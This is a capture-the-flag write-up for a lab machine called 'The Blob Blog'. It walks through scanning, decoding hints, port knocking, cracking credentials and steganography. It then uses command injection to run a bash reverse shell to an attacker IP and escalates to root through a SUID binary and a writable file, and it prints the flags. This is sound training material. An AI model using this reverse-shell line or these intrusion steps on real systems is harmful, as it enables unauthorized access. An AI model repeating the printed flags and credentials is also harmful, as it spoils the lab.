> The Blob Blog

**export IP=10.10.142.24**

# Nmap

sudo nmap -A -sC -sV -T4 -Pn -vv -p- -On nmap/initial $IP

```
22/tcp open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
```

# Page-Source - 1

`K1stLS0+Kys8XT4rLisrK1stPisrKys8XT4uLS0tLisrKysrKysrKy4tWy0+KysrKys8XT4tLisrKytbLT4rKzxdPisuLVstPisrKys8XT4uLS1bLT4rKysrPF0+LS4tWy0+KysrPF0+LS4tLVstLS0+KzxdPi0tLitbLS0tLT4rPF0+KysrLlstPisrKzxdPisuLVstPisrKzxdPi4tWy0tLT4rKzxdPisuLS0uLS0tLS0uWy0+KysrPF0+Li0tLS0tLS0tLS0tLS4rWy0tLS0tPis8XT4uLS1bLS0tPis8XT4uLVstLS0tPis8XT4rKy4rK1stPisrKzxdPi4rKysrKysrKysrKysuLS0tLS0tLS0tLi0tLS0uKysrKysrKysrLi0tLS0tLS0tLS0uLS1bLS0tPis8XT4tLS0uK1stLS0tPis8XT4rKysuWy0+KysrPF0+Ky4rKysrKysrKysrKysrLi0tLS0tLS0tLS0uLVstLS0+KzxdPi0uKysrK1stPisrPF0+Ky4tWy0+KysrKzxdPi4tLVstPisrKys8XT4tLi0tLS0tLS0tLisrKysrKy4tLS0tLS0tLS0uLS0tLS0tLS0uLVstLS0+KzxdPi0uWy0+KysrPF0+Ky4rKysrKysrKysrKy4rKysrKysrKysrKy4tWy0+KysrPF0+LS4rWy0tLT4rPF0+KysrLi0tLS0tLS4rWy0tLS0+KzxdPisrKy4tWy0tLT4rKzxdPisuKysrLisuLS0tLS0tLS0tLS0tLisrKysrKysrLi1bKys+LS0tPF0+Ky4rKysrK1stPisrKzxdPi4tLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+LlstLS0+Kys8XT4tLS4rKysrK1stPisrKzxdPi4tLS0tLS0tLS0uWy0tLT4rPF0+LS0uKysrKytbLT4rKys8XT4uKysrKysrLi0tLS5bLS0+KysrKys8XT4rKysuK1stLS0tLT4rPF0+Ky4tLS0tLS0tLS0uKysrKy4tLS4rLi0tLS0tLS4rKysrKysrKysrKysrLisrKy4rLitbLS0tLT4rPF0+KysrLitbLT4rKys8XT4rLisrKysrKysrKysrLi4rKysuKy4rWysrPi0tLTxdPi4rK1stLS0+Kys8XT4uLlstPisrPF0+Ky5bLS0tPis8XT4rLisrKysrKysrKysrLi1bLT4rKys8XT4tLitbLS0tPis8XT4rKysuLS0tLS0tLitbLS0tLT4rPF0+KysrLi1bLS0tPisrPF0+LS0uKysrKysrKy4rKysrKysuLS0uKysrK1stPisrKzxdPi5bLS0tPis8XT4tLS0tLitbLS0tLT4rPF0+KysrLlstLT4rKys8XT4rLi0tLS0tLi0tLS0tLS0tLS0tLS4tLS1bLT4rKysrPF0+Li0tLS0tLS0tLS0tLS4tLS0uKysrKysrKysrLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+Li0tLS0tLS0uLS0tLS0tLS0tLS0tLi0tLVstPisrKys8XT4uLS0tLS0tLS0tLS0tLi0tLS4rKysrKysrKysuLVstPisrKysrPF0+LS4tLS0tLVstPisrPF0+LS4tLVstLS0+Kys8XT4tLg==` => base64 encoded

Looks like Eosteric language Brainfuck

`+[--->++<]>+.+++[->++++<]>.---.+++++++++.-[->+++++<]>-.++++[->++<]>+.-[->++++<]>.--[->++++<]>-.-[->+++<]>-.--[--->+<]>--.+[---->+<]>+++.[->+++<]>+.-[->+++<]>.-[--->++<]>+.--.-----.[->+++<]>.------------.+[----->+<]>.--[--->+<]>.-[---->+<]>++.++[->+++<]>.++++++++++++.---------.----.+++++++++.----------.--[--->+<]>---.+[---->+<]>+++.[->+++<]>+.+++++++++++++.----------.-[--->+<]>-.++++[->++<]>+.-[->++++<]>.--[->++++<]>-.--------.++++++.---------.--------.-[--->+<]>-.[->+++<]>+.+++++++++++.+++++++++++.-[->+++<]>-.+[--->+<]>+++.------.+[---->+<]>+++.-[--->++<]>+.+++.+.------------.++++++++.-[++>---<]>+.+++++[->+++<]>.-.-[->+++++<]>-.++[-->+++<]>.[--->++<]>--.+++++[->+++<]>.---------.[--->+<]>--.+++++[->+++<]>.++++++.---.[-->+++++<]>+++.+[----->+<]>+.---------.++++.--.+.------.+++++++++++++.+++.+.+[---->+<]>+++.+[->+++<]>+.+++++++++++..+++.+.+[++>---<]>.++[--->++<]>..[->++<]>+.[--->+<]>+.+++++++++++.-[->+++<]>-.+[--->+<]>+++.------.+[---->+<]>+++.-[--->++<]>--.+++++++.++++++.--.++++[->+++<]>.[--->+<]>----.+[---->+<]>+++.[-->+++<]>+.-----.------------.---[->++++<]>.------------.---.+++++++++.-[->+++++<]>-.++[-->+++<]>.-------.------------.---[->++++<]>.------------.---.+++++++++.-[->+++++<]>-.-----[->++<]>-.--[--->++<]>-.`

=> Decoded `When I was a kid, my friends and I would always knock on 3 of our neighbors doors.  Always houses 1, then 3, then 5!`. OOh ! Looks like port knocking!

# Page-Source - 2

`Dang it Bob, why do you always forget your password?
I'll encode for you here so nobody else can figure out what it is: 
HcfP8J54AK4` => base58 encoded => `cUpC4k3s`

Can't SSH suing those creds.Let's use a tool knock to port knock. 

`python3 knock $IP 1 3 5` => as per the hint.

Now we scan again now wehave some ports open.

# Nmap - 2

nmap -A -sC -sV -T4 -Pn -vv $IP

```
21/tcp   open     ftp     syn-ack     vsftpd 3.0.2
22/tcp   open     ssh     syn-ack     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http    syn-ack     Apache httpd 2.4.7 ((Ubuntu))
445/tcp  open     http    syn-ack     Apache httpd 2.4.7 ((Ubuntu))
993/tcp  filtered imaps   no-response
8080/tcp open     http    syn-ack     Werkzeug httpd 1.0.1 (Python 3.5.3)
```

# Port - 21 (FTP)

And looking into ftp using creds `bob`:`cUpC4k3s`, we got an image looks like stego.

Let's use stegcracker `sudo stegcracker cool.jpeg /snap/john-the-ripper/rockyou.txt`

# Port - 445

Looking at the page source we have Bob's password

`Bob, I swear to goodness, if you can't remember p@55w0rd 
It's not that hard`. let's use this for SSH. No luck

Or we can use this same password for steghide and we have it.

```
zcv:p1fd3v3amT@55n0pr => Vigenere cipher encoded
/bobs_safe_for_stuff => Port 445
```

```
Remember this next time bob, you need it to get into the blog! I'm taking this down tomorrow, so write it down!
- youmayenter (Maybe the key for viginere)
```

Yep we have the creds `bob:d1ff3r3ntP@55w0rd`

# Gobuster - Port 8080 

sudo gobuster -u http://10.10.154.144:8080/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -o gobuster/initial -t 20

```
/blog (Status: 200)
/blog1 (Status: 200)
/blog2 (Status: 200)
/blog3 (Status: 200)
/blog4 (Status: 200)
/blog5 (Status: 200)
/blog6 (Status: 200)
/login (Status: 200)
```

We can login using `bob:d1ff3r3ntP@55w0rd` and we have nothing interesting and we find a input box where we can execute commands. Let's use a reverse shell `bash -i >& /dev/tcp/10.8.107.21/1234 0>&1`

And we are in as www-data and we can su as bob using the 1st found password .

# Privilege Escalation

find / -perm -u=s -type f 2>/dev/null

```
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/ubuntu-app-launch/oom-adjust-setuid-helper
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/arping
/usr/bin/blogFeedback => Looks interesting!
/usr/bin/passwd
/bin/ntfs-3g
/bin/su
/bin/fusermount
/bin/mount
/bin/ping
/bin/umount
```

And in this blogfeedback let's see we can use the previosly viewef blogs from 1 to 6.

And 

`blogFeedback 1 2 3 4 5 6
Hmm... I disagree! 
blogFeedback 6 5 4 3 2 1
`

and we are in as `bobloblaw`

# user.txt

```
THM{C0NGR4t$_g3++ing_this_fur}
```

We have a message popping up every time let's search the reason.

`grep -Rl "You haven’t rooted me yet? Jeez" / 2> /dev/null`

We have a file `-rw-rw----  1 bobloblaw bobloblaw   92 Jul 30 09:33 .boring_file.c` with write permissions. 

Let's put a reverse shell there and we have the root.

# root.txt

```
THM{G00D_J0B_G3++1NG+H3R3!}
```